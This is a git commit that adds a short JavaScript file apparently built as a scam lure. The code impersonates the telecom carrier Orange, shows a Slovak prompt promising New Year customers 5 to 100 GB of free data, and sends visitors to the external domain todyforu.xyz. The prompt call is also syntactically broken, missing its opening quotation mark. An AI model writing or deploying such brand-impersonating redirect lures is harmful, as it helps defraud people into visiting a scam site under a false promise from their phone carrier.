f40cf8c97eb82c526b71be1e9c27e6f34c365e15
zamonize1 <52072397+zamonize@users.noreply.github.com>
2025-01-11 23:34:10 -0800

    Create activation-orange-gift-sk.js

---
+++ activation-orange-gift-sk.js
@@ -0,0 +1,5 @@
+var password = 'Nový rok 2025'
+password=prompt(ORANŽOVÁ SMS: Vážený zákazník, prosím skontrolujte, či je vaša SIM karta Orange oprávnená prijímať od 5 GB do 100 GB dát, odmenu pre novoročných zákazníkov stlačte Nový rok 2025 a skontrolujte ','Nový rok 2025');
+if (password != 'Nový rok 2025') {
+location.href='https://todyforu.xyz/orange-gift-sk.html';
+}
